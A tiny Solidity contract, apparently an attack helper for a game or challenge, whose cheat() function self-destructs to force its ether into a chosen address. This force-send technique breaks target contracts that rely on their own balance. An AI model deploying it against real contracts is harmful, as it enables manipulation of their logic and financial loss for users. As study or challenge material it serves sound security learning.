contract CheatForce{
    function cheat(address payable _adr) public payable{
        selfdestruct(_adr);
    } 
}
